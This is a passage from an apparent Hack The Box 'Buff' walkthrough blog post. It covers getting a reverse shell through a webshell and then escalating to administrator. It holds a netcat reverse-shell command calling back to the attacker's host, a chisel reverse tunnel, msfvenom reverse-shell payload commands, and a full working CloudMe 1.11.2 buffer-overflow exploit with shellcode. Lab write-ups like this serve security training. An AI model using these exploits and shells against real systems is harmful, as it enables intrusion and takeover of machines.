</code></pre><p>Even better I have ncat. Let&rsquo;s share it via a web server.</p><pre tabindex=0><code>$ cp /usr/share/windows/windows-binaries/ncat.exe .

$ ruby -run -ehttpd . -p8080
</code></pre><p>Need a listener:</p><pre tabindex=0><code>$ pwncat -l 9999 -vv
</code></pre><p>Download it via the webshell (curl the powershell alias as we are on windows):</p><pre tabindex=0><code>curl http://10.10.14.146:8080/ncat.exe --output ncat.exe
</code></pre><p>Ncat wasn&rsquo;t working so I retried with nc.</p><pre tabindex=0><code>curl http://10.10.14.146:8080/nc.exe --output nc.exe
nc.exe 10.10.14.146 9999 -e powershell.exe
</code></pre><pre tabindex=0><code>PS C:\xampp\htdocs\gym\upload&gt; whoami
buff\shaun

PS C:\xampp\htdocs\gym\upload&gt; gc C:\Users\shaun\Desktop\user.txt
f03b243a0738b73cb640ee8b7b1928d7
</code></pre><h2 id=privilege-escalation-of-machine--from-shaun-to-administrator>Privilege Escalation of Machine : from shaun to administrator<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-shaun-to-administrator>#</a></h2><blockquote><p>Check for restricted services from the outside</p></blockquote><p>Ref. <a href=https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#open-ports>HackTricks - Windows Local Privilege Escalation - Open Ports</a></p><pre tabindex=0><code>PS C:\xampp\htdocs\gym\upload&gt; netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       960
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5672
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       8564
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       3176
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       528
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1088
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1548
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2160
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       668
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       688
...
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       4736
  TCP    127.0.0.1:3306         127.0.0.1:50755        TIME_WAIT       0
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       644
...
</code></pre><p>We have a MySQL server and an unknown service running locally. We may need
some pivoting technique to access it (see <a href=https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/>Network pivoting state of the art - Chisel - Reverse remote port forwarding</a>).</p><p>[chisel] is one of the best tool out there for pivoting and it has
<a href=https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_amd64.gz>a pre-compiled windows binary</a>.</p><pre tabindex=0><code>$ 7z e chisel_1.7.2_windows_amd64.gz
</code></pre><p>Start the server on your machine:</p><pre tabindex=0><code>$ chisel server -p 8080 --host 10.10.14.188 --reverse -v
2020/11/04 20:55:17 server: Reverse tunnelling enabled
2020/11/04 20:55:17 server: Fingerprint 67:21:79:97:03:c3:a6:2f:bd:d7:b9:c7:d9:1d:35:47
2020/11/04 20:55:17 server: Listening on 10.10.14.188:8080..
</code></pre><p>Upload the binary & execute the client:</p><pre tabindex=0><code>PS C:\xampp\htdocs\gym\upload&gt; curl http://10.10.14.188:8080/chisel.exe --output cyfun.exe
PS C:\xampp\htdocs\gym\upload&gt; .\cyfun.exe client -v http://10.10.14.188:8080 R:127.0.0.1:44444:127.0.0.1:8888
2020/11/04 20:05:19 client: Connecting to ws://10.10.14.188:8080
2020/11/04 20:05:20 client: Handshaking...
2020/11/04 20:05:20 client: Fingerprint 1a:a8:a6:b7:c1:58:25:d7:b0:9d:c4:51:4e:8f:b2:5e
2020/11/04 20:05:20 client: Sending config
2020/11/04 20:05:20 client: Connected (Latency 64.5615ms)
2020/11/04 20:05:20 client: tun: SSH connected
</code></pre><p>But we have no clue what service is behind this port:</p><pre tabindex=0><code>$ nmap 127.0.0.1 -p 44444 -sVC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-04 21:02 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000080s latency).

PORT      STATE SERVICE    VERSION
44444/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
</code></pre><p>The only hint we have is on the Download folder:</p><pre tabindex=0><code>C:\xampp\htdocs\gym\upload&gt; dir C:\users\shaun\Downloads\

 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\users\shaun\Downloads

14/07/2020  12:27    &lt;DIR&gt;          .
14/07/2020  12:27    &lt;DIR&gt;          ..
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   7,130,439,680 bytes free
</code></pre><p>This CloudMe seems a little bit vulnerable:</p><pre tabindex=0><code>$ searchsploit cloudme
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                             | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                    | windows/local/48499.txt
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                   | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                            | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                     | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                        | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                    | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                           | windows_x86-64/remote/46250.py
CloudMe Sync &lt; 1.11.0 - Buffer Overflow                                            | windows/remote/44027.py
CloudMe Sync &lt; 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                         | windows_x86-64/remote/44784.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

$ searchsploit -p 48389
  Exploit: CloudMe 1.11.2 - Buffer Overflow (PoC)
      URL: https://www.exploit-db.com/exploits/48389
     Path: /usr/share/exploitdb/exploits/windows/remote/48389.py
File Type: ASCII text, with CRLF line terminators
</code></pre><p>Let&rsquo;s see this BoF exploit:</p><pre tabindex=0><code>$ cp /usr/share/exploitdb/exploits/windows/remote/48389.py .
$ nvim 48389.py
</code></pre><p>It seems the embedded shellcode is only making appear calc.exe, we need a
reverse shell instead. The last option is to name the variable <em>payload</em> instead of <em>buf</em>.</p><pre tabindex=0><code>$ msfvenom -p windows/exec CMD=&#39;C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.188 9999 -e powershell.exe&#39; -b &#39;\x00\x0A\x0D&#39; -f python -v payload
</code></pre><p>The whole modified exploit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Date: 2020-04-27</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Exploit Author: Andy Bowden</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Vendor Homepage: https://www.cloudme.com/en</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Version: CloudMe 1.11.2</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Tested on: Windows 10 x86</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Instructions:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Start the CloudMe service and run the script.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> socket
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>target <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>padding1   <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1052</span>
</span></span><span style=display:flex><span>EIP        <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xB5\x42\xA8\x68</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># 0x68A842B5 -&gt; PUSH ESP, RET</span>
</span></span><span style=display:flex><span>NOPS       <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>30</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#msfvenom -a x86 -p windows/exec CMD=calc.exe -b &#39;\x00\x0A\x0D&#39; -f python</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span>  <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xdb\xd3\xbf\x10\x10\x1f\x4e\xd9\x74\x24\xf4\x5e</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x2b\xc9\xb1\x42\x83\xc6\x04\x31\x7e\x14\x03\x7e</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x04\xf2\xea\xb2\xcc\x70\x14\x4b\x0c\x15\x9c\xae</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x3d\x15\xfa\xbb\x6d\xa5\x88\xee\x81\x4e\xdc\x1a</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x12\x22\xc9\x2d\x93\x89\x2f\x03\x24\xa1\x0c\x02</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xa6\xb8\x40\xe4\x97\x72\x95\xe5\xd0\x6f\x54\xb7</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x89\xe4\xcb\x28\xbe\xb1\xd7\xc3\x8c\x54\x50\x37</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x44\x56\x71\xe6\xdf\x01\x51\x08\x0c\x3a\xd8\x12</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x51\x07\x92\xa9\xa1\xf3\x25\x78\xf8\xfc\x8a\x45</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x35\x0f\xd2\x82\xf1\xf0\xa1\xfa\x02\x8c\xb1\x38</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x79\x4a\x37\xdb\xd9\x19\xef\x07\xd8\xce\x76\xc3</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xd6\xbb\xfd\x8b\xfa\x3a\xd1\xa7\x06\xb6\xd4\x67</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x8f\x8c\xf2\xa3\xd4\x57\x9a\xf2\xb0\x36\xa3\xe5</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1b\xe6\x01\x6d\xb1\xf3\x3b\x2c\xdf\x02\xc9\x4a</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xad\x05\xd1\x54\x81\x6d\xe0\xdf\x4e\xe9\xfd\x35</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x2b\x05\xb4\x14\x1d\x8e\x11\xcd\x1c\xd3\xa1\x3b</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x62\xea\x21\xce\x1a\x09\x39\xbb\x1f\x55\xfd\x57</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x6d\xc6\x68\x58\xc2\xe7\xb8\x3b\x8b\x67\x3a\x9c</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x10\xb2\xe0\xa9\xe5\xa7\x6a\x21\x55\x69\xef\xa8</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x0c\x07\x86\x41\xba\xa5\x39\xd2\x2d\x38\xe6\x7e</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xd4\xcf\x7d\x0b\x79\x40\xde\x81\xea\xcf\xaa\x4b</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x80\x77\x27\xb4\x2b\xb2\x9b\xc1\xd8\xa7\x51\x59</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x42\x5b\xfe\xfc\x0f\xf5\xa2\xa8\x86\x6d\x3e\x3a</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x2b\x32\xae\xab\xb9\xab\x44\x1a\x49\x54\xed\x62</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>overrun    <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;C&#34;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>1500</span> <span style=color:#f92672>-</span> len(padding1 <span style=color:#f92672>+</span> NOPS <span style=color:#f92672>+</span> EIP <span style=color:#f92672>+</span> payload))	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>buf <span style=color:#f92672>=</span> padding1 <span style=color:#f92672>+</span> EIP <span style=color:#f92672>+</span> NOPS <span style=color:#f92672>+</span> payload <span style=color:#f92672>+</span> overrun 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>    s<span style=color:#f92672>=</span>socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
</span></span><span style=display:flex><span>    s<span style=color:#f92672>.</span>connect((target,<span style=color:#ae81ff>44444</span>))
</span></span><span style=display:flex><span>    s<span style=color:#f92672>.</span>send(buf)
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>    print(sys<span style=color:#f92672>.</span>exc_value)
</span></span></code></pre></div><p>I had no luck with the previous payload so I tried others:</p><pre tabindex=0><code>msfvenom -p windows/exec CMD=&#39;copy C:\users\Administrator\desktop\root.txt C:\users\shaun\Videos\cyfun.txt&#39; -b &#39;\x00\x0A\x0D&#39; -f python -v payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.188 LPORT=9999 -b &#39;\x00\x0A\x0D&#39; -f python -v payload
</code></pre><p>I had more luck with <code>windows/shell_reverse_tcp</code> but it was just service being unstable.
It&rsquo;s possible the 1st exploit tentative made the service partially crash.</p><pre tabindex=0><code>$ pwncat -l 9999 -vv
INFO: Listening on :::9999 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
INFO: Client connected from 10.10.10.198:49704 (family 2/IPv4, TCP)
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
buff\administrator

C:\Windows\system32&gt;type c:\users\Administrator\desktop\root.txt
ccf880bd191ba6b99c413b3855a8bb6d
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>